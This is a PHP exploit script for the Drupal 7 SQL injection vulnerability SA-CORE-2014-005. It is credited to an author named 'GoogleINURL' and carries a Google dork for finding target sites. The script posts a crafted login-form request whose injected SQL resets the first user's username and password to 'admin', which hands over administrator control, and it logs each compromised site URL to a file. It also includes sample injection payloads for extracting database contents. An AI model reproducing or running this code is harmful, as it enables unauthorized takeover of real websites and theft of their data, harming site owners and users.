<?php

/* Drupal 7.x SQL Injection SA-CORE-2014-005 https://www.drupal.org/SA-CORE-2014-005
  ----------------------------------------------------------
 * Drupal 7 SQL Injection vulnerability demo
 * Read more at http://milankragujevic.com/post/66
 * This will change the first user's username to admin
 * and their password to admin
 * Change $url to the website URL
  ----------------------------------------------------------
 * EXTRA INFO:
 * http://blog.sucuri.net/2014/10/drupal-sql-injection-attempts-in-the-wild.html
 * http://pastebin.com/nDwLFV3v
 * https://www.youtube.com/watch?v=rHwJYD_yTlM
 * DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py
  ----------------------------------------------------------
 * Script exploit developed by INURL - BRAZIL
 * AUTOR*: Cleiton Pinheiro / NICK: GoogleINURL
 * EMAIL*: inurllbr@gmail.com
 * Blog*: http://blog.inurl.com.br
 * Twitter*: https://twitter.com/googleinurl
 * Fanpage*: https://fb.com/InurlBrasil
 * GIT*: https://github.com/googleinurl
 * YOUTUBE* https://www.youtube.com/channel/UCFP-WEzs5Ikdqw0HBLImGGA
 * PACKETSTORMSECURITY:* http://packetstormsecurity.com/user/googleinurl/
  ----------------------------------------------------------
 * 
 * DORK: " Powered by Drupal" inurl:"user/register"
 * 
 */

error_reporting(1);
set_time_limit(0);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('allow_url_fopen', 1);
ob_implicit_flush(true);
ob_end_flush();
//echo '<pre>';

$params['url'] = isset($argv[1]) && !empty($argv[1]) ? $argv[1] : exit("SET TARGET URL ex: php exploitDrupal7.php http://target.com save.txt");
$params['output'] = isset($argv[2]) && !empty($argv[2]) ? $argv[2] : 'OUTPUT_INURL_DRUPAL7.txt';
$params['post'] = "name[0%20;update+users+set+name%3D'admin'+,+pass+%3d+'" . urlencode('$S$CTo9G7Lx2rJENglhirA8oi7v9LtLYWFrGm.F.0Jurx3aJAmSJ53g') . "'+where+uid+%3D+'1';;#%20%20]=test3&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
$params['url_request'] = '?q=node&destination=node';


//EXEMPLE INJECTIONS - http://blog.sucuri.net/2014/10/drupal-sql-injection-attempts-in-the-wild.html
//
//users passwords:
$params['post1'] = "name[0%20and%20extractvalue(1,concat(0x5c,(select+md5(1016)+from+users+limit+0,1)));%23%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";

//select information_schema.tables:
$params['post1'] = "name[0%20and%20extractvalue(1,concat(0x5c,(select md5(1122) from 
information_schema.tables limit 1)));%23%20%20]=removed&name[0]=removed&pass=removed&
removed=removed&form_build_id=&form_id=user_login_block&op=Log+in";

function __request($params) {

    $objcurl = curl_init();
    curl_setopt($objcurl, CURLOPT_URL, $params['url'] . $params['url_request']);
    curl_setopt($objcurl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($objcurl, CURLOPT_HEADER, 1);
    curl_setopt($objcurl, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'X-Requested-With: XMLHttpRequest',
        "Referer: {$params['url']}",
        'Accept-Language: en-US,en;q=0.5',
        'Cookie: bb_lastvisit=1400483408; bb_lastactivity=0;'
    ));
    curl_setopt($objcurl, CURLOPT_REFERER, $params['url'] . $params['url_request']);
    curl_setopt($objcurl, CURLOPT_POSTFIELDS, $params['post']);

    $corpo = curl_exec($objcurl);
    curl_close($objcurl);

    if (stristr($corpo, 'mb_strlen() expects parameter 1 to be string') && $corpo) {
        echo "[INFO]: VULNERABLE! Log in with username \"admin\" and password \"admin\" at {$params['url']}/user/login \n";
        echo "[INFO][OUTPUT]: {$params['output']}\n";
        $output = "-------------------------------------\n";
        $output.= "[INFO][URL]: {$params['url']}/user/login\n";
        $output.= "[INFO][LOGIN]: admin / pass: admin\n";
        $output.= "[INFO][DATE]: " . date("d-m-Y H:i:s");
        $output.= "\n-------------------------------------\n\n";
        echo $output;
        file_put_contents($params['output'], $output, FILE_APPEND);
    } else {
        echo "[INFO]: NOT Vulnerable , or your Internet isn't working. \n\n";
    }
}

//EXECUT...
__request($params);
